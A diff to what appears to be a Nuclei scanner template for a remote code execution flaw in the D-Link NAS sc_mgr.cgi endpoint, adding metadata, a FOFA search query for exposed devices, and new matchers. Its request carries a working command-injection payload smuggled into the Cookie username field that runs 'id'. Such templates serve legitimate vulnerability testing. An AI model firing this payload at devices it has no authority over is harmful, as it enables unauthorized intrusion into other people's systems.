@@ -1,14 +1,18 @@
-id: dlink-dns-rce
+id: dlink-nas-rce
 
 info:
-  name: D-Link DNS Remote Code Execution
+  name: D-Link NAS `sc_mgr.cgi` - Remote Code Execution
   author: adeljck
   severity: critical
   description: |
-    This template checks for remote code execution vulnerability in D-Link DNS devices.
+    The D-Link NAS interface sc_mgr.cgi contains a command execution vulnerability that allows attackers to execute arbitrary commands on the device, potentially leading to unauthorized access or control over the system.
   remediation: |
     To remediate this vulnerability, ensure that the device firmware is updated to the latest version provided by the manufacturer. Additionally, consider implementing network segmentation and firewall rules to restrict unauthorized access to the device.
-
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: 'body="/cgi-bin/login_mgr.cgi" && body="cmd=cgi_get_ssl_info"'
+  tags: dlink,nas,rce
 variables:
   random_str: "{{randstr}}"
 
@@ -17,19 +21,20 @@ http:
       - |
         GET /cgi-bin/sc_mgr.cgi?cmd=SC_Get_Info HTTP/1.1
         Host: {{Hostname}}
-        Accept: */*
-        Accept-Encoding: gzip, deflate
-        Connection: close
         Cookie: username={{random_str}}'& id & echo '{{random_str}};
 
     matchers-condition: and
     matchers:
+      - type: regex
+        part: body
+        regex:
+          - "uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)"
+
+      - type: word
+        part: body
+        words:
+          - "{{random_str}}"
+
       - type: status
         status:
           - 200
-      - type: regex
-        regex:
-          - "(?m){{random_str}}.*uid=\\d+.*gid=\\d+"
-      - type: word
-        words:
-          - "{{random_str}}"
